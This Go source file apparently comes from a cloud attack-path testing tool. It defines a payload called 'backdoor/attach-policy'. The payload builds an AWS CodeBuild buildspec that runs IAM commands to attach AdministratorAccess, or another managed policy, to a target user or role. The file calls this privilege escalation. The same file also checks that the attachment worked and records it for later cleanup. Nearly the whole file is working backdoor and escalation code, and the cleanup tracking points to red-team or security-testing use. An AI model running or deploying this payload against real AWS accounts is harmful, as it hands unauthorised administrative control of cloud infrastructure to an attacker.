// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package codebuild

import (
	"context"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload generates a CodeBuild buildspec that attaches a managed
// policy to an IAM user or role. The buildspec runs as bash inside the CodeBuild
// container, executing with the project's service role credentials. The target
// principal and policy ARN are embedded at generation time since buildspec bash
// cannot read pathrunner options from environment variables at runtime.
type BackdoorAttachPolicyPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess (or any managed policy) to an IAM user or role via CodeBuild buildspec"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceCodeBuild,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach the policy to (auto-resolved from caller identity if not set)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Managed policy ARN to attach",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode returns a buildspec YAML that attaches the given policy to the target
// principal. TARGET_ARN is parsed at generation time to choose the correct IAM command
// (attach-user-policy vs attach-role-policy) since buildspec bash cannot read pathrunner
// option values from environment variables at runtime.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	principalName, principalType := payloads.PrincipalFromARN(targetARN)

	var attachCmd string
	if principalType == "role" {
		attachCmd = fmt.Sprintf("aws iam attach-role-policy --role-name %s --policy-arn %s", principalName, policyArn)
	} else {
		attachCmd = fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", principalName, policyArn)
	}

	buildspec := fmt.Sprintf(`version: 0.2
phases:
  build:
    commands:
      - echo "Starting privilege escalation via buildspec override..."
      - %s
      - echo "Successfully attached %s to %s (%s)"
`, attachCmd, policyArn, principalName, principalType)

	return buildspec, nil
}

// VerifySuccess confirms the policy attachment by checking the target principal's policies.
// Called with the original starting identity after the build completes and IAM propagates.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	targetARN := options["TARGET_ARN"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	if targetARN == "" {
		return false, nil
	}

	principalName, principalType := payloads.PrincipalFromARN(targetARN)
	iamClient := iam.NewFromConfig(config)

	switch principalType {
	case "role":
		result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
			RoleName: aws.String(principalName),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	default:
		_, err := iamClient.ListUsers(ctx, &iam.ListUsersInput{MaxItems: aws.Int32(1)})
		if err != nil {
			return false, nil
		}
		result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
			UserName: aws.String(principalName),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	}
	return false, nil
}

// ReportSideEffects returns the policy attachment as a tracked resource so workspace
// cleanup can later detach it.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetARN := options["TARGET_ARN"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := "AdministratorAccess"
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	principalName, principalType := payloads.PrincipalFromARN(targetARN)
	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}

// ProcessResult returns a summary string. CodeBuild build output is not captured
// in the startbuild response, so the result comes from the module's verify step.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

